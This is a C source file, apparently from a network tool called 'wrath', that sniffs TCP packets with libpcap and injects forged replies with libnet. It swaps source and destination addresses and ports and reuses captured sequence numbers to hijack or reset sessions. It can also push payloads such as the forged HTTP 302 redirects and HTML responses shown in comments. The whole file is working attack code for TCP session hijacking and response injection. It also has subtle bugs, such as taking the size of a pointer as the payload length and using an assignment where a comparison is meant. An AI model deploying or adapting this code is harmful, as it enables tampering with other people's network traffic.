#include <libnet.h>
#include <pcap.h>
#include "wrath-structs.h"
#include "wrath-utils.h"
#include "wrath-applevel.h"

void wrath_build_and_launch(u_char *, const u_char *, u_char *);

void wrath_inject(u_char *args, const struct pcap_pkthdr *cap_header, const u_char *packet) {
	struct lcp_package *package = (struct lcp_package *) args;
	libnet_t *libnet_handle = package->libnet_handle;
	struct arg_values *cline_args = package->cline_args;
	char *app_cmd;
	
	/* test for input file:
		if an input file exists, assume it contains all encoding information.
		read the file's data onto the heap.
		present the pointer to wrath_build.
	
	   if an input file does not exist see if an operation does.
	   
	   if an operation does not exist only pass null pointer.
	*/
	if (strcmp(cline_args->input_file, "\0") != 0) { // If an input file has been specified
		int app_fd, length;
		app_fd = open(cline_args->input_file, O_RDONLY, 0);
		if ((length = file_size(app_fd)) == -1)
			fatal_error("getting file size");
		unsigned char *ptr = (unsigned char *) safe_malloc(length);
		read(app_fd, ptr, length);
		app_cmd = ptr;
	} else if (strcmp(cline_args->command, "\0") != 0) // If a command has been specified but not an input file
		app_cmd = cline_args->command;

	/* looks to see if an operation is set.
	 * when operations are set packets are only launched in 
	 * response to packets which share their operations 
	 * protocol */
	char *op = cline_args->operation;
	if (strcmp(op, "http") == 0 || strcmp(op, "HTTP") == 0 ) {
		//wrath_http_nltocr(app_cmd);
		if (strstr(packet + LIBNET_ETH_H + (2 * LIBNET_TCP_H) , "HTTP") != NULL) {
			printf("HTTP Packet sniffed\n");
			wrath_build_and_launch(args, packet, app_cmd);	
		}
	// else if (strcmp(op, "ftp") == 0 || strcmp(op, "FTP") == 0)
	} else if (strcmp(op, "\0") == 0 || strcmp (op, "tcp") == 0 || strcmp(op, "TCP") == 0) // TCP is default
			wrath_build_and_launch(args, packet, NULL);	
}

void wrath_build_and_launch(u_char *args, const u_char *packet, unsigned char *payload) {
	struct lcp_package *package = (struct lcp_package *) args;
	libnet_t *libnet_handle = package->libnet_handle;
	struct arg_values *cline_args = package->cline_args;

	struct libnet_ipv4_hdr *iphdr;
	struct libnet_tcp_hdr *tcphdr;

	//char payload[] = "HTTP/1.1 302 Found\r\nLocation:http://ada.evergreen.edu/~stenic05\r\n\r\n";
	//char payload[] = "HTTP/1.1 302 Found\r\nLocation:http://en.wikipedia.org/wiki/Tupac_Shakur\r\n\r\n";
	//char payload[] = "HTTP/1.1 200 OK\r\nServer: WRATH\r\nConnection: close\r\nContent-Type: text/html; charset=utf-8\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n<html><img src=\"http://3.bp.blogspot.com/-Lz-g9K2Mc8A/UH-YAgdMRJI/AAAAAAAALoI/45KMc_bLRFc/s1600/papa_murphys_jack-o-lantern_pizza.jpg\"/></html>";

	iphdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
	tcphdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

	printf("Hijacking ... ");
	printf("%s:%hu -->", inet_ntoa(iphdr->ip_src), ntohs(tcphdr->th_sport)); // ip_src and ip_dst are in_addr structs
	printf(" %s:%hu\n", inet_ntoa(iphdr->ip_dst), ntohs(tcphdr->th_dport));
	printf("With ... ");
	printf("%s:%hu -->", inet_ntoa(iphdr->ip_dst), ntohs(tcphdr->th_dport)); // ip_src and ip_dst are in_addr structs
	printf(" %s:%hu\n", inet_ntoa(iphdr->ip_src), ntohs(tcphdr->th_sport));
	printf("Payload: %s\n", payload);

	printf("TCP SUM: %d\n", (cline_args->tcp_fin + cline_args->tcp_rst + cline_args->tcp_syn + cline_args->tcp_ack + cline_args->tcp_urg + cline_args->tcp_psh));

	
	/* libnet_build_tcp */
	libnet_build_tcp(
	ntohs(tcphdr->th_dport),	// source port (preted to be from destination port)
	ntohs(tcphdr->th_sport),	// destination port (pretend to be from source port)
	ntohl(tcphdr->th_ack),		// +(calc_len(upper_level)),	// seq (pretend to be next packet)
	ntohl(tcphdr->th_seq),		// ack
	(cline_args->tcp_rst
	+ cline_args->tcp_fin
	+ cline_args->tcp_syn
	+ cline_args->tcp_ack
	+ cline_args->tcp_urg
	+ cline_args->tcp_psh),		// flags	
	4096,				// window size -- the higher this is the least likely fragmentation will occur
	0,				// checksum: 0 = libnet auto-fill
	0,				// URG pointer	
	0,				// len
	(u_int8_t *)payload,			// *payload (maybe app-level here)
	sizeof(payload),			// payload length
	libnet_handle,			// pointer libnet context	
	0);				// ptag: 0 = build a new header
	
	libnet_build_ipv4(LIBNET_TCP_H, // length
	IPTOS_LOWDELAY,			// type of service
	libnet_get_prand(LIBNET_PRu16), // IP ID (serial)
	0,				// fragmentation
	128,				// TTL should be high to avoid being dropped in transit to a server
	IPPROTO_TCP,			// upper-level protocol
	0,				// checksum: 0 = libnet auto-fill
	iphdr->ip_dst.s_addr,  		// source (pretend to be destination)
	iphdr->ip_src.s_addr,  		// destination (pretend to be source)
	NULL,				// optional payload
	0,				// payload length
	libnet_handle,			// pointer libnet context
	0);				// ptag: 0 = build a new header	

	libnet_write(libnet_handle);

	if (cline_args->sleep_time = -1) 	
		usleep(5000);		// jump out of the storm 
	else 
		usleep(cline_args->sleep_time);
}
